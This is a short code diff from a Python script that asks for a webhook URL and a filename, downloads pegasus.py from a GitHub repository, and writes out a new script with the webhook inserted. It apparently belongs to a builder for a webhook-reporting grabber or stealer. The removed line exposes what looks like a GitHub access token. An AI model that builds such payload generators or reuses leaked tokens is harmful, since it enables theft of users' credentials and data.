@@ -20,7 +20,7 @@ __________
     webhook = str(input(Fore.CYAN + "Webhook URL: " + Style.RESET_ALL))
     filename = str(input(Fore.CYAN + "Filename: " + Style.RESET_ALL))
     
-    raw = requests.get('https://raw.githubusercontent.com/addi00000/pegasus/main/pegasus.py?token=GHSAT0AAAAAABQE3SPPEGHX65SSXEMVSWU4YSJZJEA').text
+    raw = requests.get('https://raw.githubusercontent.com/addi00000/pegasus/main/pegasus.py').text
     
     print(Fore.YELLOW + f"Creating {filename}.py with '{webhook}' as webhook..." + Style.RESET_ALL)
     
